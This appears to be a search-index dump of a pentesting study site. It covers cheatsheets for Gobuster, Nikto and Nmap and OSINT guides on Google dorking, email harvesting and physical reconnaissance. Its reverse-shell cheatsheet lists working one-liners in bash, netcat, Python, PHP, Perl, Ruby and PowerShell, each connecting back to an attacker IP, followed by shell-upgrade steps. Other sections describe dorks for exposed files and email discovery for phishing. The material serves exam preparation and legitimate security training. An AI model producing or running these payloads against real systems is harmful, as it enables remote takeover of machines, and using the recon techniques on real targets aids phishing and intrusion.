How Gobuster Works","text":"<p>Gobuster works by taking a wordlist and appending each word to the target URL or domain. It sends HTTP requests to check if each resource exists. It's multithreaded, making it much faster than traditional tools like <code>dirb</code>.</p>"},{"location":"cheatsheets/gobuster/#basic-usage-directory-scan","title":"\ud83d\ude80 Basic Usage (Directory Scan)","text":"<pre><code>gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt;\n</code></pre>"},{"location":"cheatsheets/gobuster/#example","title":"\u2705 Example:","text":"<pre><code>gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p>This will scan the target URL for common directories/files.</p>"},{"location":"cheatsheets/gobuster/#common-options","title":"\ud83d\udd27 Common Options","text":"Option Description <code>dir</code> Use directory/file brute-forcing mode <code>dns</code> Brute-force DNS subdomains <code>vhost</code> Brute-force virtual hostnames <code>s3</code> Brute-force S3 buckets <code>-u</code> Target URL or domain <code>-w</code> Path to wordlist <code>-t</code> Number of concurrent threads (default: 10) <code>-x</code> File extensions to append (e.g., <code>.php,.html</code>) <code>-o</code> Output results to file <code>-q</code> Quiet mode (only shows results) <code>-e</code> Show full URLs in output <code>--timeout</code> Timeout per request"},{"location":"cheatsheets/gobuster/#examples-by-mode","title":"\ud83d\udd0d Examples by Mode","text":""},{"location":"cheatsheets/gobuster/#directory-scan","title":"\ud83d\udcc2 Directory Scan","text":"<pre><code>gobuster dir -u http://example.com -w /path/to/wordlist.txt\n</code></pre>"},{"location":"cheatsheets/gobuster/#with-extensions","title":"\ud83e\udde0 With Extensions","text":"<pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html\n</code></pre>"},{"location":"cheatsheets/gobuster/#subdomain-scan","title":"\ud83c\udf10 Subdomain Scan","text":"<pre><code>gobuster dns -d example.com -w /usr/share/wordlists/dns/namelist.txt\n</code></pre>"},{"location":"cheatsheets/gobuster/#virtual-host-scan","title":"\ud83c\udfe0 Virtual Host Scan","text":"<pre><code>gobuster vhost -u http://example.com -w /usr/share/wordlists/vhosts.txt\n</code></pre>"},{"location":"cheatsheets/gobuster/#pro-tips","title":"\ud83d\udccc Pro Tips","text":"<ul> <li>Use with Burp Suite to intercept suspicious or 403 responses.</li> <li>Combine Gobuster with <code>wfuzz</code> for parameter fuzzing.</li> <li>Use different status codes to identify potential hidden pages (e.g., 301, 403, 200).</li> </ul>"},{"location":"cheatsheets/gobuster/#limitations","title":"\u26a0\ufe0f Limitations","text":"<ul> <li>Does not support recursive directory discovery (yet).</li> <li>Can be blocked by WAFs and rate-limiting mechanisms.</li> <li>Wordlist quality directly impacts results.</li> </ul>"},{"location":"cheatsheets/gobuster/#when-to-use-gobuster","title":"\u2705 When to Use Gobuster","text":"<ul> <li>To enumerate directories and files on a web server</li> <li>To discover subdomains of a target domain</li> <li>To check for hidden or sensitive resources during a web app pentest</li> </ul>"},{"location":"cheatsheets/gobuster/#pro-tip","title":"\ud83d\udca1 Pro Tip","text":"<p>Use Gobuster with well-known wordlists like those from <code>SecLists</code>, such as: <pre><code>/usr/share/seclists/Discovery/Web-Content/common.txt\n</code></pre></p> <p>Combine it with <code>-x</code> for extension testing and <code>-t</code> for speed tuning.</p>"},{"location":"cheatsheets/nikto/","title":"Nikto","text":"<p>Nikto is an open-source web server scanner written in Perl. It is designed to identify potential vulnerabilities, misconfigurations, outdated software, and insecure files or scripts on web servers.</p> <p>Nikto performs comprehensive tests against web servers for: - Dangerous files/CGIs - Outdated server software - Insecure HTTP headers - Common configuration issues</p>"},{"location":"cheatsheets/nikto/#how-nikto-works","title":"\u2699\ufe0f How Nikto Works","text":"<p>Nikto uses a database of known vulnerabilities and scan signatures. It sends crafted HTTP requests to the target server and analyzes the responses to identify issues.</p> <p>It is not stealthy \u2014 it's fast and noisy, meaning it can be easily detected by intrusion detection/prevention systems.</p>"},{"location":"cheatsheets/nikto/#basic-usage","title":"\ud83d\ude80 Basic Usage","text":"<pre><code>nikto -h &lt;target&gt;\n</code></pre>"},{"location":"cheatsheets/nikto/#example","title":"\u2705 Example:","text":"<pre><code>nikto -h http://192.168.1.100\n</code></pre> <p>Scans the target web server for vulnerabilities.</p>"},{"location":"cheatsheets/nikto/#common-options","title":"\ud83d\udd27 Common Options","text":"Option Description <code>-h</code> Host to scan (IP or URL) <code>-p</code> Port to scan (default: 80 for HTTP) <code>-ssl</code> Force SSL connection (useful for HTTPS on non-443 ports) <code>-Tuning</code> Tune the scan type (e.g., files, robots.txt, etc.) <code>-o</code> Output results to file <code>-Format</code> Output format: <code>csv</code>, <code>txt</code>, <code>xml</code>, etc. <code>-Display</code> Customize output verbosity <code>-timeout</code> Set request timeout <code>-evasion</code> Attempt evasion techniques to avoid WAFs"},{"location":"cheatsheets/nikto/#example-scan-https-on-custom-port-with-output","title":"\ud83d\udd27 Example: Scan HTTPS on custom port with output","text":"<pre><code>nikto -h https://example.com -p 8443 -o scan_results.txt -Format txt\n</code></pre>"},{"location":"cheatsheets/nikto/#scan-tuning","title":"\ud83d\udccc Scan Tuning","text":"<p>Use the <code>-Tuning</code> option to focus on specific types of tests. Values include:</p> Code Scan Type 0 File Upload 1 Interesting Files 2 Misconfigurations 3 Information Disclosure 4 Injection Vulns (e.g., XSS) 5 Remote File Retrieval 6 Denial of Service 7 Remote Execution 8 Command Execution 9 SQL Injection <p>Example: <pre><code>nikto -h http://192.168.1.100 -Tuning 123\n</code></pre> This scans for interesting files, misconfigurations, and info disclosure.</p>"},{"location":"cheatsheets/nikto/#limitations-of-nikto","title":"\u26a0\ufe0f Limitations of Nikto","text":"<ul> <li>Not stealthy \u2014 easily detectable</li> <li>Can produce false positives</li> <li>Does not exploit vulnerabilities, only detects</li> <li>Can be slow on large servers with many endpoints</li> </ul>"},{"location":"cheatsheets/nikto/#when-to-use-nikto","title":"\u2705 When to Use Nikto","text":"<ul> <li>Reconnaissance and enumeration during penetration testing</li> <li>Quick scans for common vulnerabilities in web apps</li> <li>Checking default and dangerous files (like <code>/phpinfo.php</code>, <code>/admin/</code>, etc.)</li> </ul>"},{"location":"cheatsheets/nikto/#pro-tip","title":"\ud83d\udca1 Pro Tip","text":"<p>Run Nikto in combination with tools like Nmap, Gobuster, and Burp Suite for better coverage and correlation of results.</p>"},{"location":"cheatsheets/nmap/","title":"Nmap","text":""},{"location":"cheatsheets/nmap/#host-discovery","title":"host discovery","text":"<pre><code>sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n</code></pre> <ul> <li><code>-sn</code>    Disables port scanning.</li> </ul>"},{"location":"cheatsheets/nmap/#scan-ip-list","title":"Scan IP List","text":"<pre><code> sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n</code></pre> <ul> <li><code>-iL</code>    Performs defined scans against targets in provided 'hosts.lst' list.</li> </ul>"},{"location":"cheatsheets/nmap/#scan-multiple-ips","title":"Scan Multiple IPs","text":"<pre><code>sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5\n</code></pre> <p>If these IP addresses are next to each other, we can also define the range in the respective octet.</p> <pre><code>sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5\n</code></pre>"},{"location":"cheatsheets/nmap/#scan-single-ip","title":"Scan Single IP","text":"<pre><code>sudo nmap 10.129.2.18 -sn -oA host \n</code></pre> <p>There are a total of 6 different states for a scanned port we can obtain:</p> State Description open This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. closed When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. filtered Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target. unfiltered This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed. open|filtered If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. closed|filtered This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall."},{"location":"cheatsheets/revshell-cheatsheet/","title":"Reverse Shell Cheatsheet (PNPT/OSCP)","text":"<p>First, start a listener on your attacker machine to catch the incoming connection. Always start your listener first!</p> <p>Your IP Address: <code>10.10.10.10</code> (replace with your actual TUN0/VPN IP) Your Port: <code>443</code> (using common ports like 80, 443, or 53 can sometimes bypass firewall egress filters)</p>"},{"location":"cheatsheets/revshell-cheatsheet/#netcat-nc","title":"Netcat (<code>nc</code>)","text":"<p>The classic. Reliable and simple.</p> <pre><code>sudo nc -nvlp 443\n</code></pre> <ul> <li><code>-n</code>: No DNS resolution (faster).</li> <li><code>-v</code>: Verbose output (shows you when a connection comes in).</li> <li><code>-l</code>: Listen mode.</li> <li><code>-p</code>: Port number to listen on.</li> <li><code>sudo</code>: Use sudo if you're listening on a privileged port (1-1024).</li> </ul>"},{"location":"cheatsheets/revshell-cheatsheet/#the-payloads-getting-the-shell","title":"The Payloads: Getting the Shell","text":"<p>Run one of these commands on the target/victim machine.</p>"},{"location":"cheatsheets/revshell-cheatsheet/#bash","title":"Bash","text":"<p>The most common shell on Linux.</p> <p>Standard TCP:</p> <pre><code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1\n</code></pre> <p>Shorter Version:</p> <pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1'\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#netcat-nc_1","title":"Netcat (nc)","text":"<p>If <code>nc</code> is on the target, it can be used to send a shell back.</p> <p>Classic (requires <code>-e</code> flag, which is often disabled):</p> <pre><code>nc -e /bin/bash 10.10.10.10 443\n</code></pre> <p>FIFO Pipe (if -e is missing):</p> <pre><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.10.10 443 &gt; /tmp/f\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#python","title":"Python","text":"<p>Almost always available on Linux systems.</p>"},{"location":"cheatsheets/revshell-cheatsheet/#python-2","title":"Python 2:","text":"<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#python-3","title":"Python 3:","text":"<pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#php","title":"PHP","text":"<p>Very common for web server command injection vulnerabilities.</p> <pre><code>php -r '$sock=fsockopen(\"10.10.10.10\",443);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre> <p>:::note If injecting into a web URL, you may need to URL-encode this payload. Use a tool like CyberChef. :::</p>"},{"location":"cheatsheets/revshell-cheatsheet/#perl","title":"Perl","text":"<pre><code>perl -e 'use Socket;$i=\"10.10.10.10\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.10.10.10\",443).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#windows-payloads","title":"Windows Payloads","text":""},{"location":"cheatsheets/revshell-cheatsheet/#powershell-very-common","title":"PowerShell (Very Common)","text":"<p>This is your go-to for modern Windows systems.</p> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <ul> <li><code>nop</code> stands for <code>NoProfile</code>, which makes it load faster.</li> </ul>"},{"location":"cheatsheets/revshell-cheatsheet/#ncexe","title":"nc.exe","text":"<p>If you can upload a file, upload <code>nc.exe</code> (a common version is available with the <code>Nmap</code> installation on Windows).</p> <pre><code>nc.exe -e cmd.exe 10.10.10.10 443\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#upgrading-to-a-fully-interactive-tty","title":"Upgrading to a Fully Interactive TTY","text":"<p>You've got a shell, but it's basic. You can't use tab complete, arrow keys, or <code>clear</code>. Let's fix that.</p>"},{"location":"cheatsheets/revshell-cheatsheet/#step-1-spawn-a-better-shell-with-python-on-the-victim-machine","title":"Step 1: Spawn a better shell with Python (on the victim machine)","text":"<p>This is the most common method.</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# If python3 isn't available, try 'python' or 'python2'\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#step-2-get-terminal-info-on-your-attacker-machine","title":"Step 2: Get Terminal Info (on your attacker machine)","text":"<p>Check your terminal size.</p> <pre><code>stty size\n# Output might be: 24 80\n</code></pre>"},{"location":"cheatsheets/revshell-cheatsheet/#step-3-background-the-shell-on-your-attacker-machine","title":"Step 3: Background the shell (on your attacker machine)","text":"<p>Press Ctrl + Z to background your <code>nc</code> listener.</p>"},{"location":"cheatsheets/revshell-cheatsheet/#step-4-set-up-your-local-terminal-on-your-attacker-machine","title":"Step 4: Set up your local terminal (on your attacker machine)","text":"<p>This command gives your local terminal raw mode, so keystrokes like <code>Ctrl+C</code> are passed to the remote host instead of killing your shell.</p> <pre><code>stty raw -echo; fg\n</code></pre> <p>After typing this, type <code>fg</code> and press Enter. This will bring your reverse shell back to the foreground.</p>"},{"location":"cheatsheets/revshell-cheatsheet/#step-5-final-setup-on-the-victim-machine","title":"Step 5: Final Setup (on the victim machine)","text":"<p>Your shell will look weird and might not show what you type. Just type these commands blindly and press Enter.</p> <pre><code>reset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows 24 cols 80 # Use the values from Step 2\n</code></pre> <p>Congratulations! You now have a fully interactive shell. You can use arrow keys, tab completion, <code>clear</code>, <code>su</code>, <code>ssh</code>, and <code>nano</code>/<code>vim</code>.</p>"},{"location":"cheatsheets/revshell-cheatsheet/#troubleshooting-tips","title":"Troubleshooting Tips","text":"<ul> <li>Connection Refused: Your listener isn't running, you used the wrong port, or a firewall on the victim's end is blocking the connection.</li> <li>Connection Times Out: An egress firewall on the victim's network is blocking the outbound connection. Try a different port (80, 53, 8080).</li> <li>Shell Immediately Dies: You might be catching the shell with /bin/sh which doesn't have an interactive mode. Try specifying /bin/bash in your payload. Also, ensure your listener is still running.</li> <li>Command Not Found: The payload you're using (python, nc, perl) doesn't exist on the target. Enumerate the system's /bin and /usr/bin directories to see what's available and use a different payload.</li> <li>URL Encoding: For web exploits, make sure your payload is properly URL encoded. A space (     ) becomes %20, a plus (+) becomes %2B, a quote (') becomes %27, etc. Use CyberChef to be safe.</li> </ul>"},{"location":"linux-priv-esc/getting-started/","title":"Introduction to Linux Privilege Escalation","text":"<p>to be published soon!</p>"},{"location":"osint/Google%20Fu/","title":"Google Fu","text":"<p>Google Fu (also known as Google Hacking or Google Dorking) is the skill of using Google's advanced search operators to find information that is not readily available through simple keyword searches. For a red teamer, it's one of the most powerful and essential passive reconnaissance techniques. You can uncover sensitive documents, login pages, vulnerable servers, and configuration files without ever sending a single packet to the target's systems.</p>"},{"location":"osint/Google%20Fu/#key-search-operators","title":"Key Search Operators \u2699\ufe0f","text":"<p>The power of Google Fu comes from combining a few key operators to filter and refine your search results.</p>"},{"location":"osint/Google%20Fu/#site","title":"<code>site:</code>","text":"<p>Restricts your search to a single website or domain. This is the most fundamental operator for targeted reconnaissance.</p> <ul> <li>Example: Find all pages on the <code>example.com</code> website that mention the word \"login\".     <pre><code>site:example.com intext:login\n</code></pre></li> </ul>"},{"location":"osint/Google%20Fu/#filetype","title":"<code>filetype:</code>","text":"<p>Filters results to a specific file extension. This is incredibly useful for finding documents that were never intended to be public.</p> <ul> <li>Example: Find all PDF files on <code>example.com</code>.     <pre><code>site:example.com filetype:pdf\n</code></pre></li> <li>Commonly sought filetypes: <code>pdf</code>, <code>xls</code>, <code>xlsx</code>, <code>doc</code>, <code>docx</code>, <code>txt</code>, <code>log</code>, <code>sql</code>, <code>cfg</code></li> </ul>"},{"location":"osint/Google%20Fu/#inurl","title":"<code>inurl:</code>","text":"<p>Searches for specific text within the URL of a page. This helps find specific pages like admin portals or login forms.</p> <ul> <li>Example: Find any URL on <code>example.com</code> that contains the word \"admin\".     <pre><code>site:example.com inurl:admin\n</code></pre></li> </ul>"},{"location":"osint/Google%20Fu/#intitle","title":"<code>intitle:</code>","text":"<p>Searches for specific text within the title of a web page.</p> <ul> <li>Example: Find pages with \"index of\" in their title, which often reveals open directory listings.     <pre><code>intitle:\"index of\"\n</code></pre></li> </ul>"},{"location":"osint/Google%20Fu/#intext","title":"<code>intext:</code>","text":"<p>Searches for specific text within the body content of a web page. This is more specific than a standard search.</p> <ul> <li>Example: Find pages on a specific site that contain the phrase \"password reset\".     <pre><code>site:example.com intext:\"password reset\"\n</code></pre></li> </ul>"},{"location":"osint/Google%20Fu/#combining-operators-for-powerful-queries","title":"Combining Operators for Powerful Queries \ud83e\udde9","text":"<p>The real magic happens when you chain these operators together.</p>"},{"location":"osint/Google%20Fu/#find-login-pages","title":"Find Login Pages","text":"<p>Combine <code>site</code>, <code>inurl</code>, and <code>intitle</code> to find potential administration portals.</p> <pre><code>site:target.com inurl:login | intitle:login | inurl:admin\n</code></pre>"},{"location":"osint/Google%20Fu/#discover-sensitive-documents","title":"Discover Sensitive Documents","text":"<p>Combine <code>site</code>, <code>filetype</code>, and <code>intext</code> to hunt for internal documents, spreadsheets with employee data, or configuration files.</p> <pre><code>site:target.com filetype:xls intext:username\nsite:target.com filetype:sql \"password\"\nsite:target.com filetype:log \"error\"\n</code></pre>"},{"location":"osint/Google%20Fu/#find-open-directory-listings","title":"Find Open Directory Listings","text":"<p>An \"index of\" search reveals server directories that are not protected, giving you access to raw file listings.</p> <pre><code>site:target.com intitle:\"index of /\"\n</code></pre>"},{"location":"osint/Google%20Fu/#uncover-error-messages","title":"Uncover Error Messages","text":"<p>Error messages can leak information about the software, versions, and paths used on a web server.</p> <pre><code>site:target.com \"SQL syntax error\" | \"fatal error\"\n</code></pre>"},{"location":"osint/Google%20Fu/#the-google-hacking-database-ghdb","title":"The Google Hacking Database (GHDB) \ud83d\udcda","text":"<p>You don't always have to create these queries from scratch. The Google Hacking Database (GHDB) is a curated database of thousands of Google Dorks created by the security community. It's an invaluable resource for finding dorks that uncover specific vulnerabilities, technologies, and sensitive data.</p> <ul> <li>Hosted by Exploit-DB: You can browse the GHDB to find dorks categorized by the type of information they reveal.</li> <li>Categories Include:<ul> <li>Footholds</li> <li>Files Containing Usernames</li> <li>Sensitive Directories</li> <li>Web Server Detection</li> <li>Vulnerable Files</li> <li>Error Messages</li> </ul> </li> </ul> <p>Before starting any reconnaissance, checking the GHDB for pre-made dorks related to your target's technology stack (e.g., \"WordPress\", \"Joomla\", \"Apache\") can save you a significant amount of time.</p>"},{"location":"osint/Identifying%20Website%20Technologies/","title":"Identifying Website Technologies","text":"<p>You can identify a website's technologies using browser extensions, online tools, and command-line scanners. These tools work by analyzing HTTP headers, source code, and directory structures to detect the frameworks, servers, and analytics services a site uses.</p>"},{"location":"osint/Identifying%20Website%20Technologies/#browser-extensions-the-easiest-method","title":"Browser Extensions (The Easiest Method) \ud83c\udf10","text":"<p>Browser extensions are the quickest and easiest way to see the technology stack of a website as you browse. They overlay information directly in your browser.</p>"},{"location":"osint/Identifying%20Website%20Technologies/#wappalyzer","title":"Wappalyzer","text":"<p>Wappalyzer is the most popular tool in this category. It's a browser extension that creates a list of technologies it detects on the current website, showing you everything from the web server and programming language to the advertising networks and analytics tools.</p> <ul> <li>How it Works: It identifies technologies by detecting unique patterns in the website's source code, cookies, and network responses.</li> <li>Information Gained:<ul> <li>CMS: WordPress, Joomla, Drupal</li> <li>Frameworks: React, Angular, Vue.js</li> <li>Server Software: Nginx, Apache, IIS</li> <li>Analytics: Google Analytics, Hotjar</li> <li>Programming Language: PHP, Ruby, Java</li> </ul> </li> </ul>"},{"location":"osint/Identifying%20Website%20Technologies/#builtwith","title":"BuiltWith","text":"<p>BuiltWith is another powerful extension that provides an extremely detailed list of a site's technologies, often including the date it first detected a particular technology on the site.</p>"},{"location":"osint/Identifying%20Website%20Technologies/#online-scanners","title":"Online Scanners \ud83d\udcbb","text":"<p>If you don't want to install an extension, several websites let you input a URL to get a detailed technology report.</p>"},{"location":"osint/Identifying%20Website%20Technologies/#netcraft","title":"Netcraft","text":"<p>Site Report by Netcraft is a classic tool that provides a deep dive into a website's server-side information.</p> <ul> <li>Objective: To get detailed information about a site's hosting, SSL/TLS certificates, and network infrastructure.</li> <li>Information Gained:<ul> <li>Hosting Provider: Amazon Web Services, GoDaddy, etc.</li> <li>Netblock Owner: The organization that owns the IP address range.</li> <li>SSL/TLS Details: Certificate issuer, validity period, and configuration.</li> <li>Site History: Changes in IP address or operating system over time.</li> </ul> </li> </ul>"},{"location":"osint/Identifying%20Website%20Technologies/#command-line-tools-for-automation-and-deeper-scans","title":"Command-Line Tools (For Automation and Deeper Scans) \u2699\ufe0f","text":"<p>Command-line tools are essential for penetration testers as they can be scripted and often provide more detailed, low-level information.</p>"},{"location":"osint/Identifying%20Website%20Technologies/#whatweb","title":"WhatWeb","text":"<p>WhatWeb is a powerful, next-generation scanner included in Kali Linux. It uses over 1,800 plugins to identify a vast array of technologies.</p> <ul> <li>Objective: To identify technologies with a high level of detail, including version numbers.</li> <li>Example Usage:     <pre><code>whatweb example.com\n</code></pre></li> <li>Example Output:     <pre><code>[http://example.com](http://example.com) [200 OK]\nApache[2.4.29]\nCountry[UNITED STATES]\nHTML5\nHTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)]\nJQuery\nPHP[7.2.24]\nScript\nTitle[Example Domain]\nX-Frame-Options[SAMEORIGIN]\n</code></pre>     This output tells you the web server (Apache 2.4.29), operating system (Ubuntu), and programming language (PHP 7.2.24) at a glance.</li> </ul>"},{"location":"osint/Identifying%20Website%20Technologies/#manual-techniques-for-when-tools-fail","title":"Manual Techniques (For When Tools Fail) \ud83d\udd75\ufe0f","text":"<p>Sometimes, tools can be blocked or misleading. Manually inspecting a website's code and network traffic is a fundamental skill.</p>"},{"location":"osint/Identifying%20Website%20Technologies/#1-view-page-source-ctrlu","title":"1. View Page Source (<code>Ctrl+U</code>)","text":"<p>The HTML source code is full of clues.</p> <ul> <li>What to Look For:<ul> <li>Comments: ``</li> <li>Linked Files: Paths like <code>/wp-content/</code> strongly indicate WordPress. Paths like <code>/sites/default/files/</code> suggest Drupal.</li> <li>Script Tags: You can see which JavaScript libraries (like React or jQuery) are being loaded.</li> </ul> </li> </ul>"},{"location":"osint/Identifying%20Website%20Technologies/#2-check-http-headers","title":"2. Check HTTP Headers","text":"<p>Headers sent from the server often explicitly state the technology being used. You can view these in your browser's Developer Tools (F12) under the \"Network\" tab or with a command-line tool like <code>curl</code>.</p> <ul> <li>Command:     <pre><code>curl -I [http://example.com](http://example.com)\n</code></pre></li> <li>What to Look For:<ul> <li><code>Server</code>: <code>Server: nginx/1.18.0</code></li> <li><code>X-Powered-By</code>: <code>X-Powered-By: PHP/8.1.0</code> or <code>X-Powered-By: ASP.NET</code></li> <li><code>Set-Cookie</code>: Cookies like <code>wp-settings-</code> are a clear sign of WordPress.</li> </ul> </li> </ul>"},{"location":"osint/email-discovery/","title":"Discovering Email Addresses","text":"<p>Finding valid email addresses is a cornerstone of passive reconnaissance. It's the primary method for targeting individuals in phishing campaigns and can reveal usernames and company-wide email patterns. This guide covers the essential tools, websites, and techniques to uncover email addresses.</p>"},{"location":"osint/email-discovery/#1-automated-osint-tools","title":"1. Automated OSINT Tools \ud83e\udd16","text":"<p>Automated tools are the most efficient way to gather emails. They query multiple public sources at once and aggregate the results.</p>"},{"location":"osint/email-discovery/#theharvester","title":"theHarvester","text":"<p>A staple in any pentester's toolkit, <code>theHarvester</code> is a command-line tool included in Kali Linux. It gathers emails, subdomains, employee names, and open ports from public sources like search engines and PGP key servers.</p> <ul> <li>How it Works: You provide a domain, and it queries sources like Google, Bing, Hunter.io, and more to find any associated email addresses.</li> <li>Example Usage:     <pre><code>theharvester -d example.com -b all\n</code></pre><ul> <li><code>-d</code>: Specifies the target domain.</li> <li><code>-b</code>: Specifies the data source (e.g., <code>google</code>, <code>bing</code>, <code>hunter</code>, or <code>all</code>).</li> </ul> </li> </ul>"},{"location":"osint/email-discovery/#2-specialised-websites-and-services","title":"2. Specialised Websites and Services \ud83c\udf10","text":"<p>Several web-based platforms are built specifically for finding professional email addresses. They often have free tiers that are perfect for targeted reconnaissance.</p>"},{"location":"osint/email-discovery/#hunterio","title":"Hunter.io","text":"<p>Hunter is one of the most popular and powerful services for finding email addresses. It crawls the web and indexes publicly available professional email addresses.</p> <ul> <li>Objective: To find email addresses associated with a specific company or professional.</li> <li>Resources:<ul> <li>Domain Search: You enter a company domain (e.g., <code>example.com</code>), and it returns known email addresses and the most common email pattern (e.g., <code>{first}.{last}@example.com</code>).</li> <li>Email Finder: If you know a person's full name and the company they work for, Hunter can find their specific email address.</li> <li>Browser Extension: A Chrome extension allows you to find emails for the website you're currently visiting.</li> </ul> </li> </ul>"},{"location":"osint/email-discovery/#other-notable-services","title":"Other Notable Services","text":"<ul> <li>PhoneBook.cz: Allows you to see all emails, subdomains, and URLs associated with a domain. It's a simple but powerful web-based tool.</li> <li>VoilaNorbert: Another popular service that finds corporate emails. You provide a name and a company domain.</li> </ul>"},{"location":"osint/email-discovery/#3-manual-search-engine-techniques-google-dorking","title":"3. Manual Search Engine Techniques (Google Dorking) \ud83d\udd75\ufe0f","text":"<p>Using advanced search operators, you can force search engines like Google to uncover email addresses that have been indexed in public documents and web pages.</p> <ul> <li>Objective: To find emails within specific file types or on particular websites.</li> <li>Common Dorks for Email Discovery:<ul> <li>Find emails on a specific website:     <pre><code>site:example.com \"email\"\n</code></pre></li> <li>Search for specific file types that often contain email lists (like spreadsheets):     <pre><code>site:example.com filetype:xls intext:\"email\"\n</code></pre></li> <li>Combine terms to find employee lists:     <pre><code>filetype:pdf intext:\"@example.com\" \"contact\"\n</code></pre></li> <li>Find emails on social or code-sharing platforms:     <pre><code>site:github.com \"@example.com\"\n</code></pre></li> </ul> </li> </ul>"},{"location":"osint/email-discovery/#4-social-media-and-professional-networks","title":"4. Social Media and Professional Networks \ud83e\uddd1\u200d\ud83d\udcbc","text":"<p>People often list their contact information publicly on professional networking sites.</p> <ul> <li>LinkedIn: The most valuable resource. While direct emails are often hidden, people may list them in their \"Contact Info\" section or even in their profile summary or posts. It's also the best place to find names and job titles to use with a tool like Hunter.io.</li> <li>GitHub: Developers frequently commit code with their email address in the commit logs. If a company has a public GitHub organization, you can inspect the commit history of its employees to find their emails.</li> </ul>"},{"location":"osint/email-discovery/#5-breach-databases","title":"5. Breach Databases \ud83d\udca5","text":"<p>While ethically grey and legally complex, checking public data breach dumps can reveal corporate email addresses and password patterns. This is an advanced technique and should be approached with caution.</p> <ul> <li>Resource: <code>Have I Been Pwned?</code> offers a domain search feature that allows administrators to see all email addresses from their domain that have appeared in publicly known data breaches. This is a legitimate service for defensive purposes but illustrates how breach data can be used.</li> </ul>"},{"location":"osint/passive-recon/","title":"Passive Reconnaissance","text":"<p>Passive reconnaissance is the art of gathering intelligence about a target from publicly available sources without directly engaging or alerting them. The goal is to build a detailed operational picture before launching any active scanning or exploitation.</p>"},{"location":"osint/passive-recon/#location-information","title":"Location Information \ud83d\uddfa\ufe0f","text":"<p>Understanding the physical layout of a target's facility is crucial for planning red team operations, from social engineering attempts to physical intrusion tests.</p>"},{"location":"osint/passive-recon/#1-satellite-images","title":"1. Satellite Images","text":"<p>High-resolution satellite imagery provides a bird's-eye view of the target facility, revealing critical details long before you set foot near the property.</p> <ul> <li>Objective: To map the perimeter, identify key infrastructure, and pinpoint potential points of entry or weakness.</li> <li>Tools: <code>Google Maps</code>, <code>Google Earth</code>, <code>Bing Maps</code>.</li> <li>Information Gained:<ul> <li>Perimeter Security: Location of fences, gates, and potential blind spots.</li> <li>Access Control: Identify vehicle entry points, guard shacks, and employee/visitor parking lots.</li> <li>Surveillance: Spotting visible security cameras on the building's exterior.</li> <li>Key Locations: Pinpointing entrances, loading docks, break areas, and executive offices.</li> </ul> </li> </ul>"},{"location":"osint/passive-recon/#2-drone-recon-the-passive-approach","title":"2. Drone Recon (The Passive Approach)","text":"<p>While flying your own drone is active reconnaissance, you can often find pre-existing drone footage that others have made public.</p> <ul> <li>Objective: To find high-quality, low-altitude aerial video or photos of the target.</li> <li>Sources: <code>YouTube</code>, 